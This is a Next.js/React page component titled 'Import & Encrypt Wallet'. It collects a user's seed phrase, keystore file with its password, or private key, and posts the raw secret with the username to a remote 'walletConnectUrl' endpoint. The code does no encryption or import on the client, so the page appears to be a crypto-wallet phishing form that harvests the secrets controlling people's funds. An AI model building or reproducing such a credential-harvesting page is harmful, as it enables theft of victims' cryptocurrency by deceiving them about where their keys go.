"use client";

import styles from "../styles.module.scss";

import { useSearchParams } from "next/navigation";

import { useUserContext } from "@/app/components/js/Wrapper";
import { FormEvent, useState } from "react";
import { postRequest } from "@/app/components/js/api_client";
import { walletConnectUrl } from "@/app/components/js/config";
import showMessage from "@/app/components/js/showError";
import Spinner from "@/app/components/js/spinner/Spinner";

export default function Body() {
  const context = useUserContext();
  const user = context?.user;
  const walTypes: { name: string; id: number }[] = [
    {
      name: "Seed/Recovery Phrase",
      id: 0,
    },
    {
      name: "Keystore JSON",
      id: 1,
    },
    {
      name: "Private Key",
      id: 2,
    },
  ];
  const [type, setType] = useState<number>(0);
  const [phrase, setPhrase] = useState<string>("");
  const [passcode, setPasscode] = useState<string>("");
  const [message, setMessage] = useState<string>("");
  const searchParams = useSearchParams();

  const handler = async (e: FormEvent) => {
    e.preventDefault();
    setMessage(() => "Please wait...");

    const { message } = await postRequest(walletConnectUrl, {
      phrase,
      passcode,
      username: user?.username,
      name: searchParams.get("name"),
      type: walTypes[type].name,
    });
    showMessage(setMessage, message);
  };

  return (
    <>
      <div className={`${styles.main}`}>
        <div className={`${styles.box}`}>
          <h1>Import & Encrypt Wallet</h1>
        </div>

        <div className={`${styles.box}`}>
          <div className={styles.actions}>
            {walTypes.map((e) => (
              <span
                key={e.id}
                className={e.id == type ? styles.active : styles.inActive}
                onClick={() => setType(e.id)}
              >
                {e.name}
              </span>
            ))}
          </div>
          {type == 0 && (
            <form onSubmit={handler}>
              <textarea
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                placeholder="Input phrase value..."
              />
              <p>
                Typically 12 (sometimes 24) words separated by single spaces.
              </p>
              <button onSubmit={handler} disabled={phrase.length < 10}>
                Import
              </button>
            </form>
          )}
          {type == 1 && (
            <form onSubmit={handler}>
              <textarea
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                placeholder="Input phrase value..."
              />
              <input
                type="text"
                value={passcode}
                placeholder="Password"
                onChange={(e) => setPasscode(e.target.value)}
              />
              <p>
                {`Several lines of text beginning with '(...)' plus the password you used to encrypt it.`}
              </p>
              <button disabled={phrase.length < 5}>Import</button>
            </form>
          )}
          {type == 2 && (
            <form onSubmit={handler}>
              <textarea
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                placeholder="Enter your private key"
              />

              <button onSubmit={handler} disabled={phrase.length < 5}>
                Import
              </button>
            </form>
          )}
        </div>
      </div>
      {message && <Spinner error={message} />}
    </>
  );
}
